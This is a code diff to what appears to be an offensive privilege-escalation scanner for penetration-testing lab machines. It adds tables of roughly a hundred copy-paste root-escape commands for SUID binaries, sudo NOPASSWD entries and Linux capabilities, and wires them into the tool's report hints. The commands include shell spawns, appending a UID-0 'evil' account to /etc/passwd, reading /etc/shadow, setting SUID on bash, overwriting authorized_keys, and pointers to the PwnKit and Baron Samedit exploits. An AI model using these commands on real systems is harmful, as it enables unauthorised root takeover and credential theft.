@@ -804,6 +804,8 @@ _AD = [
         r'sys_ptrace|net_admin|sys_module|sys_chroot|sys_time|audit_control)'
         r'(?:[,+=][\w+]+)?)(?:\s|,|$)',
         re.MULTILINE)),
+    # iter-215: pkexec CVE-2021-4034 PwnKit hint gate. Not a detector -
+    # gate defined below when we see any SUID pkexec entry.
     # NFS export with no_root_squash - direct root via remote NFS mount + suid.
     ("NFS no_root_squash", re.compile(
         r'(?im)^(/\S+)\s+\S[^\r\n]*\bno_root_squash\b')),
@@ -1515,6 +1517,288 @@ _TASK_SCHED_XML = re.compile(
     r'[\s\S]{0,300}?'
     r'<LogonType>(Password|InteractiveTokenOrPassword|S4U)</LogonType>'
 )
+
+# iter-215: Per-binary escape lookup tables consulted by the existing
+# SUID GTFOBins / sudo NOPASSWD / Linux capability emit sites so the
+# operator gets a specific copy-paste-able escape command instead of a
+# generic "check GTFOBins for the binary" hint. Covers the top ~60
+# binaries seen on OSCP+ retired-lab boxes.
+#
+# NOTE: escapes use `-p` (retain SUID) for SUID paths and drop `-p`
+# for sudo paths because sudo already re-elevates to the target user.
+_GTFOBINS_SUID = {
+    # Shells - direct
+    "bash": "./bash -p",
+    "sh": "./sh -p",
+    "dash": "./dash -p",
+    "ash": "./ash -p",
+    "zsh": "./zsh -p",
+    "csh": "./csh -p",
+    "ksh": "./ksh -p",
+    # Interpreters
+    "python": "./python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
+    "python2": "./python2 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
+    "python3": "./python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
+    "perl": "./perl -e 'exec \"/bin/sh\",\"-p\";'",
+    "ruby": "./ruby -e 'exec \"/bin/sh\",\"-p\"'",
+    "php": "./php -r \"pcntl_exec('/bin/sh',['-p']);\"",
+    "node": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'",
+    "lua": "./lua -e 'os.execute(\"/bin/sh -p\")'",
+    "tclsh": "./tclsh <<< 'exec /bin/sh -p <@stdin >@stdout 2>@stderr'",
+    "expect": "./expect -c 'spawn /bin/sh -p; interact'",
+    "awk": "./awk 'BEGIN {system(\"/bin/sh -p\")}'",
+    "gawk": "./gawk 'BEGIN {system(\"/bin/sh -p\")}'",
+    "mawk": "./mawk 'BEGIN {system(\"/bin/sh -p\")}'",
+    # Text/edit tools
+    "vim": "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
+    "vi": "./vi -c ':!/bin/sh -p'",
+    "view": "./view -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
+    "rvim": "./rvim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
+    "vimdiff": "./vimdiff -c ':!/bin/sh -p'",
+    "less": "./less /etc/profile then !/bin/sh -p",
+    "more": "./more /etc/profile then !/bin/sh -p",
+    "nano": "./nano then ^R^X then 'reset; sh 1>&0 2>&0'",
+    "emacs": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
+    "ed": "./ed then !/bin/sh -p",
+    "ex": "./ex then !/bin/sh -p",
+    "sed": "./sed -e '' /etc/shadow reads shadow as SUID user",
+    # Utilities
+    "find": "./find . -exec /bin/sh -p \\\\; -quit",
+    "nmap": "./nmap --interactive then !sh (old nmap only)",
+    "env": "./env /bin/sh -p",
+    "socat": "./socat stdin exec:'/bin/sh -p'",
+    "gdb": "./gdb -nx -ex '!/bin/sh -p' -ex quit",
+    "gcc": "./gcc -wrapper /bin/sh,-s .",
+    "make": "COMMAND='/bin/sh'; ./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"''",
+    "screen": "./screen -h - then :exec !!bash",
+    "tmux": "./tmux new-session '/bin/sh -p'",
+    "git": "./git help config then !/bin/sh -p",
+    "smbclient": "./smbclient //x/y then !/bin/sh -p",
+    "ftp": "./ftp then !/bin/sh -p",
+    "sftp": "./sftp -o AuthenticationMethods=none x@y then !/bin/sh -p",
+    # Read/write primitives
+    "cat": "./cat /etc/shadow reads shadow file",
+    "tac": "./tac /etc/shadow reads shadow (reversed)",
+    "head": "./head -n 999 /etc/shadow",
+    "tail": "./tail -n 999 /etc/shadow",
+    "cp": "./cp /bin/bash /tmp/rsh; ./chmod +s /tmp/rsh (chain)",
+    "chmod": "./chmod +s /bin/bash",
+    "chown": "./chown $(id -u):$(id -g) /etc/shadow",
+    "dd": "echo 'evil:x:0:0::/root:/bin/bash' | ./dd of=/etc/passwd",
+    "tee": "echo 'evil:x:0:0::/root:/bin/bash' | ./tee -a /etc/passwd",
+    "tar": ("./tar -cf /dev/null /dev/null --checkpoint=1 "
+             "--checkpoint-action=exec='/bin/sh -p'"),
+    "zip": ("TF=$(mktemp -u); ./zip $TF /etc/hosts -T "
+             "--unzip-command='sh -c /bin/sh -p'"),
+    "unzip": ("./unzip -o -x -d /root/.ssh/ malicious.zip "
+              "(overwrites authorized_keys)"),
+    # Wrappers
+    "flock": "./flock -u /tmp/x /bin/sh -p",
+    "time": "./time /bin/sh -p",
+    "timeout": "./timeout 7d /bin/sh -p",
+    "stdbuf": "./stdbuf -i0 /bin/sh -p",
+    "nice": "./nice /bin/sh -p",
+    "nohup": "./nohup /bin/sh -p",
+    "taskset": "./taskset 1 /bin/sh -p",
+    "setarch": "./setarch $(arch) /bin/sh -p",
+    "chroot": "./chroot / /bin/sh -p",
+    # Pkg managers (rarely SUID but included)
+    "apt": "./apt update -o APT::Update::Pre-Invoke::='/bin/sh -p'",
+    "apt-get": "./apt-get update -o APT::Update::Pre-Invoke::='/bin/sh -p'",
+    "dpkg": "./dpkg -i <malicious.deb with postinst=/bin/sh -p>",
+    "pip": ("TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
+             " > $TF/setup.py; ./pip install $TF"),
+    "pip3": ("TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
+              " > $TF/setup.py; ./pip3 install $TF"),
+    "yum": "./yum shell then \"run install ./malicious.rpm\"",
+    "dnf": "./dnf install ./malicious.rpm",
+    "apk": "./apk add --allow-untrusted ./malicious.apk",
+    # Others
+    "docker": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "openssl": "./openssl req -engine /tmp/malicious.so (payload writes /etc/passwd)",
+    "sudoedit": "CVE-2021-3156 Baron Samedit (chain: sudoedit -s ' \\\\')",
+    "pkexec": "CVE-2021-4034 PwnKit - any user to root even without SUID",
+    "systemctl": "./systemctl link /tmp/evil.service; ./systemctl start evil",
+    "service": "./service ../../../../../tmp/evil (path escape)",
+    "crontab": "./crontab -e (spawn EDITOR as root)",
+    "at": "echo '/bin/sh -p' | ./at now",
+    "mount": "./mount -o rw,remount /  (needs cap_sys_admin usually)",
+    "busybox": "./busybox sh -p",
+    "iptables": "./iptables --modprobe='/bin/sh -p' -L",
+    "ip": "./ip vrf exec default /bin/sh -p",
+    "watch": "./watch -x /bin/sh -p -c 'sh 0<&2 1>&2'",
+    "xargs": "echo | ./xargs -a /dev/null sh -p",
+    "strace": "./strace -o /dev/null /bin/sh -p",
+    "ltrace": "./ltrace -e nothing /bin/sh -p",
+    "wget": "./wget --use-askpass=/bin/sh -p /  (or --post-file=/etc/shadow)",
+    "curl": "./curl file:///etc/shadow reads shadow",
+    "iconv": "./iconv -f 8859_1 -t 8859_1 /etc/shadow reads shadow",
+    "xz": "LFILE=/etc/shadow; ./xz -c $LFILE | xz -d reads shadow",
+    "column": "./column -e /etc/shadow reads shadow",
+    "jq": "./jq -Rr . /etc/shadow reads shadow",
+    "nl": "./nl -bn /etc/shadow reads shadow",
+    "paste": "./paste /etc/shadow reads shadow",
+    "strings": "./strings /etc/shadow reads shadow",
+    "readelf": "./readelf -a /etc/shadow (may leak partial)",
+    "objdump": "./objdump -a /etc/shadow (may leak partial)",
+    "xxd": "./xxd /etc/shadow reads shadow (hex)",
+    "sudo": "may be exploitable via CVE-2019-14287 (-u#-1) or 3156",
+    "rsync": "./rsync -e '/bin/sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/tmp/",
+    "wall": "./wall broadcasts a message; low value alone",
+}
+
+# Sudo NOPASSWD escapes - launched as `sudo <bin>`. Similar to SUID but
+# no `-p` needed since sudo re-elevates to root explicitly.
+_GTFOBINS_SUDO = {
+    "bash": "sudo bash",
+    "sh": "sudo sh",
+    "dash": "sudo dash",
+    "ash": "sudo ash",
+    "zsh": "sudo zsh",
+    "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+    "python2": "sudo python2 -c 'import os; os.system(\"/bin/sh\")'",
+    "python3": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
+    "ruby": "sudo ruby -e 'exec \"/bin/sh\"'",
+    "php": "sudo php -r \"system('/bin/sh');\"",
+    "node": ("sudo node -e "
+              "'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"),
+    "lua": "sudo lua -e 'os.execute(\"/bin/sh\")'",
+    "expect": "sudo expect -c 'spawn /bin/sh; interact'",
+    "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+    "gawk": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
+    "vim": "sudo vim -c ':!/bin/sh'",
+    "vi": "sudo vi then :!/bin/sh",
+    "view": "sudo view then :!/bin/sh",
+    "less": "sudo less /etc/profile then !/bin/sh",
+    "more": "sudo more /etc/profile then !/bin/sh",
+    "nano": "sudo nano then ^R^X then 'reset; sh 1>&0 2>&0'",
+    "emacs": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'",
+    "ed": "sudo ed then !/bin/sh",
+    "ex": "sudo ex '+shell'",
+    "find": "sudo find . -exec /bin/sh \\\\; -quit",
+    "nmap": ("sudo nmap --interactive then !sh (old); new: "
+              "echo 'os.execute(\"/bin/sh\")' > /tmp/e.nse; sudo nmap "
+              "--script=/tmp/e.nse"),
+    "env": "sudo env /bin/sh",
+    "git": "sudo git -p help config then !/bin/sh",
+    "gdb": "sudo gdb -nx -ex '!/bin/sh' -ex quit",
+    "gcc": "sudo gcc -wrapper /bin/sh,-s .",
+    "make": "sudo make -s --eval=$'x:\\n\\t-/bin/sh'",
+    "screen": "sudo screen then Ctrl-a :exec !! bash",
+    "tmux": "sudo tmux new-session '/bin/sh'",
+    "socat": "sudo socat stdin exec:/bin/sh",
+    "apt": ("sudo apt update -o "
+              "APT::Update::Pre-Invoke::='/bin/sh'"),
+    "apt-get": ("sudo apt-get update -o "
+                  "APT::Update::Pre-Invoke::='/bin/sh'"),
+    "dpkg": "sudo dpkg -i <malicious.deb with postinst>",
+    "pip": ("TF=$(mktemp -d); echo 'import os; os.system(\"/bin/sh\")' > "
+             "$TF/setup.py; sudo pip install $TF"),
+    "pip3": ("TF=$(mktemp -d); echo 'import os; os.system(\"/bin/sh\")' > "
+              "$TF/setup.py; sudo pip3 install $TF"),
+    "yum": "sudo yum shell then \"run install ./malicious.rpm\"",
+    "dnf": "sudo dnf install ./malicious.rpm",
+    "rpm": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
+    "apk": "sudo apk add --allow-untrusted ./malicious.apk",
+    "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "systemctl": ("sudo systemctl link /tmp/evil.service; "
+                    "sudo systemctl start evil  |  or systemctl edit "
+                    "--full <unit>"),
+    "service": "sudo service ../../../../tmp/evil (path escape)",
+    "crontab": "sudo crontab -e (spawn EDITOR as root)",
+    "at": "echo '/bin/sh' | sudo at now",
+    "openssl": "sudo openssl enc -in /etc/shadow (read-only bypass)",
+    "wget": "sudo wget --use-askpass=/bin/sh /",
+    "curl": "sudo curl file:///etc/shadow (read) OR -o /etc/... (overwrite)",
+    "tar": ("sudo tar -cf /dev/null /dev/null --checkpoint=1 "
+             "--checkpoint-action=exec='/bin/sh'"),
+    "zip": ("TF=$(mktemp -u); sudo zip $TF /etc/hosts -T "
+             "--unzip-command='sh -c /bin/sh'"),
+    "chmod": "sudo chmod +s /bin/bash",
+    "chown": "sudo chown $(id -u):$(id -g) /etc/shadow",
+    "dd": "echo 'evil:x:0:0::/root:/bin/bash' | sudo dd of=/etc/passwd",
+    "tee": "echo 'evil:x:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
+    "cp": "sudo cp <shell-elf> /usr/local/bin/getroot",
+    "mv": "sudo mv <shell-elf> /usr/local/bin/getroot",
+    "rsync": "sudo rsync -e '/bin/sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/",
+    "mount": "sudo mount -o bind /bin/sh /bin/false (custom binding)",
+    "strace": "sudo strace -o /dev/null /bin/sh",
+    "ltrace": "sudo ltrace -e nothing /bin/sh",
+    "ftp": "sudo ftp then !/bin/sh",
+    "sftp": "sudo sftp -o AuthenticationMethods=none x@y then !/bin/sh",
+    "smbclient": "sudo smbclient //x/y then !/bin/sh",
+    "xargs": "echo | sudo xargs -a /dev/null sh",
+    "flock": "sudo flock -u /tmp/x /bin/sh",
+    "time": "sudo time /bin/sh",
+    "timeout": "sudo timeout 7d /bin/sh",
+    "stdbuf": "sudo stdbuf -i0 /bin/sh",
+    "nice": "sudo nice /bin/sh",
+    "nohup": "sudo nohup /bin/sh",
+    "taskset": "sudo taskset 1 /bin/sh",
+    "setarch": "sudo setarch $(arch) /bin/sh",
+    "chroot": "sudo chroot / /bin/sh",
+    "watch": "sudo watch -x /bin/sh -c 'sh 0<&2 1>&2'",
+    "ip": "sudo ip vrf exec default /bin/sh (Linux 4.4+)",
+    "iptables": "sudo iptables --modprobe='/bin/sh' -L",
+    "busybox": "sudo busybox sh",
+    "sed": "sudo sed -e '' /etc/shadow reads shadow",
+    "cat": "sudo cat /etc/shadow",
+    "tac": "sudo tac /etc/shadow",
+    "head": "sudo head -n 999 /etc/shadow",
+    "tail": "sudo tail -n 999 /etc/shadow",
+    "iconv": "sudo iconv -f 8859_1 -t 8859_1 /etc/shadow",
+    "xz": "sudo xz -c /etc/shadow | xz -d",
+    "column": "sudo column -e /etc/shadow",
+    "jq": "sudo jq -Rr . /etc/shadow",
+    "nl": "sudo nl -bn /etc/shadow",
+    "paste": "sudo paste /etc/shadow",
+    "strings": "sudo strings /etc/shadow",
+    "readelf": "sudo readelf -a /etc/shadow",
+    "objdump": "sudo objdump -a /etc/shadow",
+    "xxd": "sudo xxd /etc/shadow",
+    "pkexec": "sudo pkexec /bin/sh",
+    "sudoedit": "sudoedit CVE-2021-3156 Baron Samedit if pre-1.9.5p2",
+    "ansible-playbook": ("sudo ansible-playbook /dev/stdin <<< $'- "
+                          "hosts: localhost\\n  tasks:\\n  - shell: "
+                          "/bin/sh'"),
+    "wall": "sudo wall (broadcasts; low value alone)",
+}
+
+# Linux capability escape hints keyed on capability name.
+_LINUX_CAPS = {
+    "cap_setuid": ("<bin> -c 'import os; os.setuid(0); "
+                    "os.system(\"/bin/sh\")' (python/perl/ruby); "
+                    "direct root"),
+    "cap_setgid": ("<bin> -c 'import os; os.setgid(0); "
+                    "os.system(\"/bin/sh\")' - root gid; combine with "
+                    "cap_setuid for full root"),
+    "cap_dac_read_search": ("bypass file-read DAC - `<bin> "
+                             "/etc/shadow` reads any file as non-root"),
+    "cap_dac_override": ("bypass file-write DAC - `<bin> -c "
+                          "'open(\"/etc/passwd\",\"w\").write(EVIL)'` "
+                          "writes protected files"),
+    "cap_sys_admin": ("near-root - mount any device, `mount -o bind / "
+                       "/mnt`, remount rw, etc"),
+    "cap_sys_ptrace": ("attach to any process - inject shellcode "
+                        "via `<bin> -p <root-pid>` (ptrace-injector.py)"),
+    "cap_sys_module": ("load kernel modules - `insmod evil.ko` as "
+                        "non-root -> kernel-space RCE"),
+    "cap_sys_chroot": "chroot escape via double-chroot trick",
+    "cap_chown": ("chown any file - `<bin>` can chown /etc/shadow to "
+                   "your uid then read"),
+    "cap_fowner": "bypass fowner check - chmod any file",
+    "cap_kill": ("SIGKILL any process (incl. root daemons); "
+                  "shutdown auth for reset attack"),
+    "cap_net_raw": ("raw sockets - packet sniffing / ARP spoof; "
+                     "extract creds off the wire"),
+    "cap_net_bind_service": "bind low ports without root (e.g., DNS spoof)",
+    "cap_net_admin": "manage networking - iptables/nftables/tc control",
+    "cap_sys_time": ("change system time - may bypass ticket expiry "
+                      "or lockout counters"),
+    "cap_audit_control": "audit config - low value alone",
+}
+
 
 # iter-207: Postfix SMTP relay auth (/etc/postfix/sasl_passwd).
 # Format: `[relay-host]:port user:password`  OR  `[host] user:pw`.
@@ -5239,9 +5523,22 @@ def analyze(path, report, store=None):
                         break
                     if name == "sudoers NOPASSWD":
                         user, cmd = am.group(1), am.group(2).strip()
+                        # iter-215: consult _GTFOBINS_SUDO for the exact
+                        # escape - falls back to a generic "sudo <bin>"
+                        # hint when the binary isn't tabled.
+                        _sudo_bin = cmd.split()[0] if cmd else "<cmd>"
+                        _sudo_bn = os.path.basename(_sudo_bin)
+                        _sesc = _GTFOBINS_SUDO.get(_sudo_bn)
+                        if _sesc:
+                            _hint = (f"as '{user}': {_sesc}  |  ref: "
+                                     f"gtfobins.github.io/gtfobins/"
+                                     f"{_sudo_bn}")
+                        else:
+                            _hint = (f"as '{user}' run: sudo {_sudo_bin}  "
+                                     f"(check GTFOBins for escape)")
                         report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                    f"sudoers NOPASSWD  {user}  ->  {cmd[:80]}",
-                                   hint=f"as '{user}' run: sudo {cmd.split()[0] if cmd else '<cmd>'}  (check GTFOBins for escape)")
+                                   hint=_hint)
                         hit = True
                         break
                     # iter-17 (corpus mine wkl2kkzn5): sudo -l output shape
@@ -5257,10 +5554,19 @@ def analyze(path, report, store=None):
                         if filters.is_doc_file(path):
                             continue
                         bin_path = cmd.split()[0] if cmd else "<cmd>"
+                        # iter-215: same GTFOBins-sudo lookup as sudoers.
+                        _bn = os.path.basename(bin_path)
+                        _sesc = _GTFOBINS_SUDO.get(_bn)
+                        if _sesc:
+                            _hint = (f"{_sesc}  |  ref: "
+                                     f"gtfobins.github.io/gtfobins/{_bn}")
+                        else:
+                            _hint = (f"sudo {bin_path}  "
+                                     f"(gtfobins.github.io/gtfobins/{_bn}"
+                                     f" - Sudo section)")
                         report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                    f"sudo -l NOPASSWD (as {runas}) -> {cmd[:80]}",
-                                   hint=(f"sudo {bin_path}  "
-                                         f"(gtfobins.github.io/gtfobins/{os.path.basename(bin_path)} - Sudo section)"))
+                                   hint=_hint)
                         hit = True
                         break
                     # iter-17: Samba CVE-2007-2447 banner (HTB Lame)
@@ -6219,18 +6525,41 @@ def analyze(path, report, store=None):
                     if name == "SUID GTFOBins":
                         # iter-13: intel-only privesc primitive (HIGH, not
                         # CRITICAL - operator still has to validate by hand)
+                        # iter-215: consult _GTFOBINS_SUID for the exact
+                        # escape command; fall back to the generic hint
+                        # when the binary isn't tabled.
                         binary = am.group(1)
+                        _bn = os.path.basename(binary)
+                        _esc = _GTFOBINS_SUID.get(_bn)
+                        if _esc:
+                            _hint = (f"cd $(dirname {binary}); {_esc}  |  "
+                                     f"ref: gtfobins.github.io/gtfobins/{_bn}")
+                        else:
+                            _hint = (f"gtfobins.github.io/gtfobins/{_bn} - "
+                                     f"SUID section -> root")
                         report.add("HIGH", "INTERESTING FILES", path, lineno,
                                    f"SUID-root GTFOBins-able binary: {binary}",
-                                   hint=f"gtfobins.github.io/gtfobins/{os.path.basename(binary)} - SUID section -> root")
+                                   hint=_hint)
                         hit = True
                         break
                     if name == "Linux capability":
                         binary, cap = am.group(1), am.group(2)
                         # iter-13: intel-only - HIGH
+                        # iter-215: consult _LINUX_CAPS for per-cap
+                        # escape; fall back to python setuid recipe.
+                        _cap_name = cap.split("+")[0].split("=")[0]
+                        _cap_hint = _LINUX_CAPS.get(_cap_name)
+                        if _cap_hint:
+                            _hint = (_cap_hint.replace("<bin>", binary)
+                                     + f"  |  ref: /usr/sbin/capsh --decode="
+                                     f"$(echo {cap} | tr -d 'eip+=')")
+                        else:
+                            _hint = ("cap_setuid+ep on python/perl/ruby = "
+                                     "direct root: <bin> -c 'import os; "
+                                     "os.setuid(0); os.system(\"/bin/bash\")'")
                         report.add("HIGH", "INTERESTING FILES", path, lineno,
                                    f"capability {cap} on {binary}",
-                                   hint="cap_setuid+ep on python/perl/ruby = direct root: <bin> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
+                                   hint=_hint)
                         hit = True
                         break
                     if name == "NFS no_root_squash":
